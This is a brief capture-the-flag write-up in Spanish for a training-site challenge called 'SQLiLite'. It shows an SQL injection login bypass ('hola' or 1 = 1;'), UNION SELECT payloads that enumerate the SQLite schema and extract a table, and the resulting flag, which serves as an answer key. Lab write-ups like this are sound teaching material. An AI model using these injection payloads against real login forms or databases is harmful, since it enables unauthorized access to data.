## Descripcion
Can you find the flag on this website. Try to find the flag [here](http://xebec.cylabacademy.net:37507/).
SQLiLite
## solucion 
```
al ingresar datos random de inicio de sesion, la pagina nos muestra la sentencia sql...
aprobechemoms eso
```
![[Pasted image 20261005231302.png]]

![[Pasted image 20261005231513.png]]

```
en Password 
colocamos hola' or 1 = 1;
```

Accedemos a esto...

![[Pasted image 20261005231634.png]]

```
' UNION SELECT sql, name, NULL FROM sqlite_master;
```

![[Pasted image 20261005231852.png]]


```
' UNION SELECT flag, NULL, NULL FROM more_table;
```

![[Pasted image 20261005232014.png]]


```
academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_63cbcebc}
```
## notas adicionales
UNION... para hacer una consulta extra..
## referencias
